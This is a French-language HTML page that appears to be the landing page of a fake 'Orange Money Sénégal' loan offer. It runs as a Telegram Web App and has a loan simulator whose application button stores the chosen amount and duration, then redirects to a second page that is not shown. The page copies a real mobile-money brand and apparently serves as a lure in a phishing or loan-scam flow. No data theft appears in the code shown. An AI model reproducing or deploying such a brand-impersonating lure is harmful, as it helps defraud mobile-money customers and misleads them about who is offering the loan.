<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money - Obtenez Votre Prêt Rapidement</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f16e00; --orange-hover: #d66100; --bg-color: #e5e5e5; --card-bg: #ffffff; --calc-bg: #f8f9fa; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--orange-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .header-title { display: flex; align-items: center; font-size: 22px; font-weight: 800; }
        .header-title .orange { color: #d64d00; opacity: 0.85; margin-right: 6px; }
        .header-title .money { color: #000000; }
        .card { background: var(--card-bg); width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 30px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column; }
        .main-title { font-size: 26px; margin: 0 0 12px; text-align: center; font-weight: 800; }
        .subtext { font-size: 13px; color: #666666; text-align: center; margin-bottom: 28px; }
        .calculator-container { background: var(--calc-bg); border-radius: 12px; padding: 22px 18px 18px; margin-bottom: 24px; }
        .slider-section { margin-bottom: 22px; }
        .slider-header { display: flex; justify-content: space-between; align-items: center; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
        .accent-text { color: var(--orange-primary); font-weight: 800; font-size: 15px; }
        input[type=range] { width: 100%; margin: 10px 0; }
        .result-container { background: #ffffff; border: 1px solid #eeeeee; border-radius: 12px; padding: 16px; display: flex; justify-content: center; align-items: center; gap: 12px; margin-top: 20px; }
        .result-amount { color: var(--orange-primary); font-size: 22px; font-weight: 800; }
        .btn-apply { background: var(--orange-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666666; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <div style="width: 24px;"></div>
    <div class="header-title"><span class="orange">Orange</span><span class="money">Money</span></div>
</div>
<div class="card">
    <h1 class="main-title">Obtenez Votre Prêt<br>Rapidement</h1>
    <div class="subtext">Approbation rapide • Taux compétitifs • Conditions flexibles</div>
    <div class="calculator-container">
        <div style="font-weight: 700; font-size: 17px; margin-bottom: 22px;">Simulateur de Prêt</div>
        <div class="slider-section">
            <div class="slider-header"><span>Montant du Prêt</span><span id="valAmt" class="accent-text">250 000 FCFA</span></div>
            <input type="range" id="amt" min="10000" max="5000000" step="10000" value="250000">
        </div>
        <div class="slider-section">
            <div class="slider-header"><span>Durée du Prêt</span><span id="valDur" class="accent-text">12 mois</span></div>
            <input type="range" id="dur" min="6" max="60" step="1" value="12">
        </div>
        <div class="result-container">
            <span>Mensualité</span>
            <span id="monthly" class="result-amount">21 875 FCFA</span>
        </div>
    </div>
    <button class="btn-apply" onclick="goToPage2()">FAIRE UNE DEMANDE</button>
</div>
<div class="footer-banner">© 2026 Orange Money Sénégal</div>
<script>
    let calculatedMonthly = 21875;
    function formatFCFA(v) { return v.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " "); }
    function update() {
        const p = Number(document.getElementById('amt').value), d = Number(document.getElementById('dur').value);
        document.getElementById('valAmt').innerText = `${formatFCFA(p)} FCFA`;
        document.getElementById('valDur').innerText = `${d} mois`;
        calculatedMonthly = Math.round((p + (p * 0.05 * (d / 12))) / d);
        document.getElementById('monthly').innerText = `${formatFCFA(calculatedMonthly)} FCFA`;
    }
    function goToPage2() {
        localStorage.setItem('loan_amount', document.getElementById('amt').value);
        localStorage.setItem('duration', document.getElementById('dur').value);
        localStorage.setItem('monthly_repayment', calculatedMonthly);
        window.location.href = "page2.html";
    }
    window.onload = () => {
        window.Telegram?.WebApp?.ready();
        document.getElementById('amt').addEventListener('input', update);
        document.getElementById('dur').addEventListener('input', update);
        update();
    };
</script>
</body>
</html>
